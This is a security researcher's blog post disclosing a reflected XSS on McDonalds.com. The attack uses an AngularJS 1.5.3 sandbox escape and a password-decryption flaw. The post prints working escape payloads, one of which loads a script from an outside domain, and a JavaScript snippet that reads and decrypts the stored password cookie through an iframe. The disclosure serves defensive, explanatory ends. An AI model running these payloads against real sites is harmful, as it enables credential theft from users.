---
layout: post
title: Stealing passwords from McDonald's users
subtitle: Reflected XSS through AngularJS sandbox bypass causes password exposure of McDonald users.
description: By abusing an insecure cryptographic storage vulnerability and a reflected server cross-site-scripting vulnerability it is possible to steal and decrypt the password from a McDonald's user.
keywords: xss, cross-site, scripting, mcdonalds, password, vulnerability, stealing, angularjs
author: Tijme Gommers
include_in_header: false
include_in_footer: false
show_in_post_list: true
robots: index, follow
---

By abusing an insecure [cryptographic storage vulnerability](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/){:target="_blank"}{:rel="noopener noreferrer"} and a [reflected server cross-site-scripting vulnerability](https://owasp.org/Top10/A03_2021-Injection/){:target="_blank"}{:rel="noopener noreferrer"} it is possible to steal and decrypt the password from a McDonald's user. Besides that, other personal details like the user's name, address & contact details can be stolen too.

### Proof of Concept

#### Reflected XSS through AngularJS sandbox escape
McDonalds.com contains a search page which reflects the value of the search parameter (`q`) in the source of the page. So when we search on for example `***********-test-reflected-test-***********`, the response will look like this:

<div class="row mb-2">
    <div class="col-md-6">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/search-value-test-preview.png"
            title="Text on website"
            album="step-1"
            width="842"
            height="284"
        %}
    </div>
    <div class="col-md-6">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/search-value-test-reflected.png"
            title="Text in HTML"
            album="step-1"
            width="803"
            height="197"
        %}
    </div>
</div>

McDonald's uses AngularJS so we can try to print the unique scope ID using the search value. We can do this by changing the `q` parameter value to `{% raw %}{{$id}}{% endraw %}`. As we can see `{% raw %}{{$id}}{% endraw %}` gets converted to `9` the unique ID (monotonically increasing) of the AngularJS scope.

<div class="row mb-2">
    <div class="col-md-6">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/search-value-angular-id-preview.png"
            title="Unique ID on website"
            album="step-2"
            width="841"
            height="288"
        %}
    </div>
    <div class="col-md-6">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/search-value-angular-id-reflected.png"
            title="Unique ID in HTML"
            album="step-2"
            width="596"
            height="167"
        %}
    </div>
</div>

Using `{% raw %}{{alert(1)}}{% endraw %}` as value wouldn't work because all AngularJS code is executed in a sandbox. However, the AngularJS sandbox isn't really safe. In fact, it shouldn't be trusted at all. It even [got removed](https://docs.angularjs.org/guide/security#sandbox-removal){:target="_blank"}{:rel="noopener noreferrer"} in version 1.6 because it gave a false sense of security. PortSwigger created a nice blog post about [escaping the AngularJS sandbox](http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html){:target="_blank"}{:rel="noopener noreferrer"}.

We first need to find the AngularJS version of McDonalds.com. We can do this by executing `angular.version` in the console.

<div class="row mb-2">
    <div class="col-md-12">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/angular-version.png"
            title="Angular version"
            album="step-3"
            width="612"
            height="40"
        %}
    </div>
</div>

The version is 1.5.3, so the sandbox escape we need is `{% raw %}{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}{% endraw %}`. We can use this sandbox escape as search value, which results in an alert.

<div class="row mb-2">
    <div class="col-md-12">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/alert-1-in-chrome.png"
            title="Alert using AngularJS sandbox escape"
            album="step-4"
            width="1185"
            height="218"
        %}
    </div>
</div>

We can even load external JavaScript files using the following sandbox escape, which results in the alert below.

`{% raw %}{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=$.getScript(`https://tij.me/snippets/external-alert.js`)');}}{% endraw %}`

The JavaScript can be loaded from another domain since McDonald's doesn't exclude it using the `Content-Security-Policy` header.

<div class="row mb-2">
    <div class="col-md-12">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/alert-external-in-chrome.png"
            title="External domain alert using AngularJS sandbox escape"
            album="step-5"
            width="1182"
            height="222"
        %}
    </div>
</div>

### Proof of Concept

#### Stealing the user's password
Another thing I noticed on McDonalds.com was their sign in page which contained a very special checkbox. Normally you can check "Remember me" when signing in, but the McDonald's sign in page gives us the option to remember the password.

<div class="row mb-2">
    <div class="col-md-12">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/mcdonalds-login-form.png"
            title="Remember my password checkbox"
            album="step-6"
            width="977"
            height="495"
        %}
    </div>
</div>

I searched through all the JavaScript for the keyword `password` and I found some interesting code that decrypts the password.

<div class="row mb-2">
    <div class="col-md-6">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/source-search-password.png"
            title="Source code search for `password`"
            album="step-7"
            width="997"
            height="432"
        %}
    </div>
    <div class="col-md-6">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/cookie-pass-decrypt-source.png"
            title="Source for decrypting the user's password"
            album="step-7"
            width="360"
            height="250"
        %}
    </div>
</div>

If there's one thing you shouldn't do, it's decrypting passwords client side (or even storing passwords using two-way encryption). I tried to run the code myself, and it worked!

<div class="row mb-2">
    <div class="col-md-12">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/decrypt-get-cookie-penc.png"
            title="Decrypting my password using the console"
            album="step-8"
            width="217"
            height="56"
        %}
    </div>
</div>

The `penc` value is a cookie that is stored for a year. LOL!

<div class="row mb-2">
    <div class="col-md-12">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/penc-cookie.png"
            title="The `penc` cookie that is stored for a year"
            album="step-9"
            width="950"
            height="29"
        %}
    </div>
</div>

McDonald's uses CryptoJS to encrypt and decrypt sensitive data. They use the same `key` and `iv` for every user, which means I only have to steal the `penc` cookie to decrypt someone's password.

<div class="row mb-2">
    <div class="col-md-12">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/encrypt-decrypt-source.png"
            title="Encrypting and decrypting sensitive data using CryptoJS"
            album="step-10"
            width="851"
            height="198"
        %}
    </div>
</div>

I tried decrypting my password on the search page using a malicious search payload, but it didn't work. Since the AngularJS sandbox escape payload replaces the `charAt` method with the `join` method, the `getCookie` method failed. The `getCookie` method tries to trim whitespaces from cookie values by checking if `charAt(0)` is a whitespace. In the images below you can see `.charAt(0)` returns a string joined by `0` if executed on the search page.

<div class="row mb-2">
    <div class="col-md-6">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/char-at-fail.png"
            title="The `charAt` method on the search page (fails)"
            album="step-11"
            width="423"
            height="71"
        %}
    </div>
    <div class="col-md-6">
        {% 
            include lightbox.html 
            image="/img/stealing-passwords-from-mcdonalds-users/char-at-success.png"
            title="The `charAt` method on the homepage (success)"
            album="step-11"
            width="297"
            height="71"
        %}
    </div>
</div>

I wrote some JavaScript that loads the homepage in an iframe and steals the cookie using that iframe. Since the payload is executed multiple times because of the sandbox escape, I keep track of the variable `xssIsExecuted`, so that the payload is only executed once.

{% highlight javascript %}
if (!window.xssIsExecuted) {
    window.xssIsExecuted = true;

    var iframe = $('<iframe src="https://www.mcdonalds.com/us/en-us.html"></iframe>');
    $('body').append(iframe);

    iframe.on('load', function() {
        var penc = iframe[0].contentWindow.getCookie('penc');
        alert(iframe[0].contentWindow.decrypt(penc));
    });
}
{% endhighlight %}

We can now use the following sandbox escape, which results in my password in an alert box!

`{% raw %}{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=$.getScript(`https://tij.me/snippets/mcdonalds-password-stealer.js`)');}}{% endraw %}`


[![My password!](/img/stealing-passwords-from-mcdonalds-users/alert-my-password.png)](/img/stealing-passwords-from-mcdonalds-users/alert-my-password.png){:target="_blank"}{:rel="noopener noreferrer"}{:data-lightbox="step-12"}{:data-title="My password!"}

That was all pretty easy. I tried to contact McDonald's multiple times to report the issue, but unfortunately they didn't respond, which is why I decided to disclose the vulnerability.
